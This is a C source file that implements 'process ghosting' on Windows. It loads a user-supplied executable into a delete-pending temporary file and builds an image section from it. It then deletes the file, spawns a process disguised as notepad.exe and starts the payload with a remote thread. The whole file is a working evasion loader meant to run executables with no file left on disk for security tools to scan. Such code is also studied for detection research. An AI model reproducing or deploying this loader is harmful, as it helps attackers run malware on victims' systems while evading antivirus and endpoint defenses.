# include <windows.h>
# include <stdio.h>
# include "definitions.h"

# define MSG( msg, ... ) \
	printf( "[+] " msg "\n", ##__VA_ARGS__ )

# define PUTS( msg, ... ) \
	printf( "[-] " msg "\n", ##__VA_ARGS__ ); \
	return -1;
	
# define API_FPUTS( api, msg, ... ) \
	printf( "[-] " api " failed with error: %d\n\tMSG > " msg "\n", GetLastError(), ##__VA_ARGS__ ); \
	goto Cleanup

# define NT_PUTS( api, msg, ... ) \
	printf( "[-] " api " failed with error: 0x%0.8X\n\tMSG > " msg "\n", Status, ##__VA_ARGS__ ); \
	goto Cleanup

# define COMMAND_LINE L"C:\\Windows\\System32\\notepad.exe coffee"
# define CURRENT_DIR  L"C:\\Windows\\System32"
# define IMAGE_NAME   L"C:\\Windows\\System32\\notepad.exe"

NTSTATUS Status;

int main ( int argc, char* argv[] )
{
	void						 *hProcess = 0, *hSection = 0, *hPayloadFile = 0, *pLocalPayloadBuffer = 0, *hTempFile = 0, 
						         *hNtdll, *pEnvironment, *hThread;
	char						 *pPayloadFilename, *pFakeProcess;
	unsigned long				 ulFileSize, ulReturnLen, ulThreadId = 0;
	unsigned long long			 Base = 0, End = 0;
	size_t						 Total = 0, Written = 0;
	wchar_t					     TempFilepath[ MAX_PATH ] = { 0 }, NtObjectPath[ MAX_PATH ] = L"\\??\\";
	OBJECT_ATTRIBUTES			 OA;
	IO_STATUS_BLOCK				 IOBlock;
	UNICODE_STRING				 Filename, CommandLine, ImagePath, CurrentDirectory;
	FILE_DISPOSITION_INFORMATION FileInfo = { 0 };
	PRTL_USER_PROCESS_PARAMETERS ProcessParameters = 0;
	PROCESS_BASIC_INFORMATION	 ProcessBasicInfo = { 0 };
	PIMAGE_NT_HEADERS			 PayloadNtHeader  = { 0 };
	PEB							 RemotePeb = { 0 };

	if ( argc != 3 )
	{
		printf( "[-] USAGE: %s <path/to/payload.exe> <path/to/legitimate.exe & arguments>\n", argv[0] );
		return -1;
	}
	pPayloadFilename = argv[1];
	pFakeProcess	 = argv[2];

	if ( ( hNtdll = LoadLibraryA( "ntdll.dll" ) ) == NULL )
	{
		API_FPUTS( "LoadLibraryA", "Could not load ntdll for syscall retrieval" );
	}
	
	fNtOpenFile				NtOpenFile				= ( fNtOpenFile )GetProcAddress( hNtdll, "NtOpenFile" );
	fRtlInitUnicodeString	RtlInitUnicodeString	= ( fRtlInitUnicodeString )GetProcAddress( hNtdll, "RtlInitUnicodeString" );
	fNtSetInformationFile   NtSetInformationFile	= ( fNtSetInformationFile )GetProcAddress( hNtdll, "NtSetInformationFile" );
	fNtWriteFile			NtWriteFile				= ( fNtWriteFile )GetProcAddress( hNtdll, "NtWriteFile" );
	fNtCreateSection		NtCreateSection			= ( fNtCreateSection )GetProcAddress( hNtdll, "NtCreateSection" );
	fNtCreateProcessEx		NtCreateProcessEx		= ( fNtCreateProcessEx )GetProcAddress( hNtdll, "NtCreateProcessEx" );
	fCreateEnvironmentBlock CreateEnvironmentBlock	= ( fCreateEnvironmentBlock )GetProcAddress( LoadLibraryA( "userenv.dll" ), "CreateEnvironmentBlock" );
	fRtlCreateProcessParametersEx RtlCreateProcessParametersEx = ( fRtlCreateProcessParametersEx )GetProcAddress( hNtdll, "RtlCreateProcessParametersEx" );
	fNtQueryInformationProcess NtQueryInformationProcess = ( fNtQueryInformationProcess )GetProcAddress( hNtdll, "NtQueryInformationProcess" );

	/*
		Step 1: Read testing payload from user
	*/
	if ( ( hPayloadFile = CreateFileA( pPayloadFilename, GENERIC_READ | GENERIC_WRITE, FILE_SHARE_READ, 0, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, 0 ) ) == INVALID_HANDLE_VALUE )
	{
		API_FPUTS( "CreateFileA", "Could not get a handle to input file -> %s", pPayloadFilename );
	}
	if ( ( ulFileSize = GetFileSize( hPayloadFile, 0 ) ) == INVALID_FILE_SIZE )
	{
		API_FPUTS( "GetFileSize", "Could not get size of %s", pPayloadFilename );
	}
	if ( ( pLocalPayloadBuffer = VirtualAlloc( 0, ulFileSize, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE ) ) == NULL )
	{
		API_FPUTS( "VirtualAlloc", "Could not allocate %d bytes for %s", ulFileSize, pPayloadFilename );
	}
	if ( !ReadFile( hPayloadFile, pLocalPayloadBuffer, ulFileSize, 0, 0 ) )
	{
		API_FPUTS( "ReadFile", "Could not read %s to %d byte buffer at 0x%p", pPayloadFilename, ulFileSize, pLocalPayloadBuffer );
	}

	if ( ( ( PIMAGE_DOS_HEADER )pLocalPayloadBuffer )->e_magic != IMAGE_DOS_SIGNATURE )
	{
		PUTS( "Input file is not executable. Provide executable file." );
	}

	PayloadNtHeader = ( PIMAGE_NT_HEADERS )( ( unsigned long long )pLocalPayloadBuffer + ( ( PIMAGE_DOS_HEADER )pLocalPayloadBuffer )->e_lfanew );

	MSG( "Read %d bytes from %s to buffer at 0x%p", ulFileSize, pPayloadFilename, pLocalPayloadBuffer );

	/*
		Step 2: Create a dummy file
	*/
	GetCurrentDirectoryW( MAX_PATH, ( wchar_t* )TempFilepath );
	if ( GetTempFileNameW( TempFilepath, L"GST", 0, ( wchar_t* )TempFilepath ) == 0 )
	{
		API_FPUTS( "GetTempFileNameW", "Could not create a temporary file in the current directory" );
	}
	MSG( "Created a temporary file at the path %S", TempFilepath );

	/*
		Step 3: Put the file into a delete-pending state
	*/
	wcscat_s( NtObjectPath, MAX_PATH, TempFilepath );
	RtlInitUnicodeString( &Filename, NtObjectPath );
	InitializeObjectAttributes( &OA, &Filename, OBJ_CASE_INSENSITIVE, 0, 0 );

	if ( ( Status = NtOpenFile( 
		&hTempFile,
		DELETE | SYNCHRONIZE | GENERIC_READ | GENERIC_WRITE,
		&OA,
		&IOBlock,
		FILE_SHARE_READ | FILE_SHARE_WRITE,
		FILE_SUPERSEDE | FILE_SYNCHRONOUS_IO_NONALERT
		) ) != 0x0 )
	{
		NT_PUTS( "NtOpenFile", "Could not open a handle to the temporary file." );
	}

	FileInfo.DeleteFileW = TRUE;
	if ( ( Status = NtSetInformationFile( hTempFile, &IOBlock, &FileInfo, sizeof( FileInfo ), 13 ) ) != 0x0 )
	{
		NT_PUTS( "NtSetInformationFile", "Could not set delete disposition on %S", TempFilepath );
	}
	MSG( "Placed temp file into a delete pending state" );

	/*
		Step 4: Write the executable payload to the file
	*/
	if ( ( Status = NtWriteFile( hTempFile, 0, 0, 0, &IOBlock, pLocalPayloadBuffer, ulFileSize, 0, 0 ) ) != 0x0 )
	{
		NT_PUTS( "NtWriteFile", "Could not write executable payload to temporary file" );
	}
	MSG( "Wrote %lu bytes to temporary file from payload buffer @ 0x%p", ulFileSize, pLocalPayloadBuffer );
	
	/*
		Step 5: Create an image section from the executable in the temp file
	*/
	if ( ( Status = NtCreateSection( &hSection, SECTION_ALL_ACCESS, 0, 0, PAGE_READONLY, SEC_IMAGE, hTempFile ) ) != 0x0 )
	{
		NT_PUTS( "NtCreateSection", "Could not create an image section from the temp file" );
	}
	MSG( "Created section from temporary file" );

	/*
		Step 6: Delete the temporary file by closing the handle (Since handle was opened in delete-pending state)
	*/
	if ( !CloseHandle( hTempFile ) )
	{
		API_FPUTS( "CloseHandle", "Could not close the delete-pending temp files handle" );
	}
	MSG( "Deleted temporary file" );

	/*
		Step 7: Create a process from the image section
	*/
	if ( ( Status = NtCreateProcessEx( &hProcess, PROCESS_ALL_ACCESS, 0, ( HANDLE )-1, PS_INHERIT_HANDLES, hSection, 0, 0, 0)) != 0x0)
	{
		NT_PUTS( "NtCreateProcessEx", "Could not create process from image section" );
	}
	MSG( "Created ghost process from image section" );

	/*
		Step 8: Create the RTL_USER_PROCESS_PARAMETERS structure for the target process peb
	*/
	RtlInitUnicodeString( &CommandLine, COMMAND_LINE );
	RtlInitUnicodeString( &ImagePath, IMAGE_NAME );
	RtlInitUnicodeString( &CurrentDirectory, CURRENT_DIR );

	if ( !CreateEnvironmentBlock( &pEnvironment, 0, TRUE ) )
	{
		API_FPUTS( "CreateEnvironmentBlock", "Could not create environment variable block from current user." );
	}
	MSG( "Created environment variable block" );

	if ( ( Status = RtlCreateProcessParametersEx( &ProcessParameters, &ImagePath, 0, &CurrentDirectory, &CommandLine, pEnvironment, 0, 0, 0, 0, RTL_USER_PROC_PARAMS_NORMALIZED ) ) != 0x0 )
	{
		NT_PUTS( "RtlCreateProcessParametersEx", "Could not initialize process parameters structure" );
	}
	MSG( "Populated process parameters structure at 0x%p", ProcessParameters );

	/* 
		Step 9: Calculate the total amount of space required by process parameters structure.
				Alignment must be preserved so parameters are allocated at same addr in local & remote
				process
	*/
	Base = ( unsigned long long )ProcessParameters;
	End = ( unsigned long long )ProcessParameters + ProcessParameters->Length;
	
	if ( ( unsigned long long )ProcessParameters > ( unsigned long long )ProcessParameters->Environment )
	{
		Base = ProcessParameters->Environment; 
	}

	if ( ( ( unsigned long long )ProcessParameters->Environment + ProcessParameters->EnvironmentSize ) > End )
	{
		End = ( unsigned long long )ProcessParameters->Environment + ProcessParameters->EnvironmentSize;
	}
	MSG( "ProcessParameters base address is 0x%I64X. End is 0x%I64X", Base, End );
	Total = End - Base;
	
	/* 
		Step 10: Write the RTL_USER_PROCESS_PARAMETERS structure to the target process peb
	*/
	if ( !VirtualAllocEx( hProcess, ( void * )ProcessParameters, Total, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE ) )
	{
		API_FPUTS( "VirtualAllocEx", "Could not allocate memory for process parameters in remote process" );
	}
	if ( !WriteProcessMemory( hProcess, ( void* )ProcessParameters, ( void* )ProcessParameters, ProcessParameters->Length, &Written ) )
	{
		API_FPUTS( "WriteProcessMemory", "Could not write process parameters to remote process peb" );
	}
	MSG( "Wrote process parameters to remote peb at 0x%p", ( void* )ProcessParameters );

	/*
		Step 11: write the environment variables to the remote process peb
	*/
	if ( !WriteProcessMemory( hProcess, ProcessParameters->Environment, ProcessParameters->Environment, ProcessParameters->EnvironmentSize, &Written ) )
	{
		API_FPUTS( "WriteProcessMemory", "Could not update environment variable ptr @ ProcessParameters->Environment in remote process" );
	}
	MSG( "Updated environment variables" );

	/*
		Step 12: Retrieve the entry point of the remote process
	*/
	if ( ( Status = NtQueryInformationProcess( hProcess, 0, ( void* )&ProcessBasicInfo, sizeof( PROCESS_BASIC_INFORMATION ), &ulReturnLen ) ) != 0x0 )
	{
		NT_PUTS( "NtQueryInformationProcess", "Could not get address of ghost process peb" );
	}
	MSG( "Retrieved PEB of ghost process @ 0x%p", ProcessBasicInfo.PebBaseAddress );

	if ( !WriteProcessMemory( hProcess, &ProcessBasicInfo.PebBaseAddress->ProcessParameters, ( void* )&ProcessParameters, sizeof( void * ), &Written ) )
	{
		API_FPUTS( "WriteProcessMemory", "Could not update ProcessParameters ptr in remote peb" );
	}
	MSG( "Updated process parameters in remote peb" );

	if ( !ReadProcessMemory( hProcess, (void*)ProcessBasicInfo.PebBaseAddress, &RemotePeb, sizeof(PEB), &Written))
	{
		API_FPUTS( "ReadProcessMemory", "Could not get a copy of the remote peb" );
	}
	MSG( "Retrieved ghost process entry point: 0x%I64X", ( unsigned long long )RemotePeb.ImageBaseAddress + PayloadNtHeader->OptionalHeader.AddressOfEntryPoint );

	/*
		Step 13: Execute the payload
	*/

	if ( !CreateRemoteThread( hProcess, 0, 0, ( LPTHREAD_START_ROUTINE )( ( unsigned long long )RemotePeb.ImageBaseAddress + PayloadNtHeader->OptionalHeader.AddressOfEntryPoint ), 0, 0, &ulThreadId ) )
	{
		API_FPUTS( "CreateRemoteThread", "Could not create a new thread in the target process" );
	}
	MSG( "Executed payload in new thread id: %d", ulThreadId ); 

Cleanup:
	if ( hPayloadFile )
		CloseHandle( hPayloadFile );

	if ( pLocalPayloadBuffer )
		VirtualFree( pLocalPayloadBuffer, 0, MEM_RELEASE );

	if ( hSection )
		CloseHandle( hSection );

	if ( hProcess )
		CloseHandle( hProcess );

	MSG( "Cleanly finished." );
	return 0;
}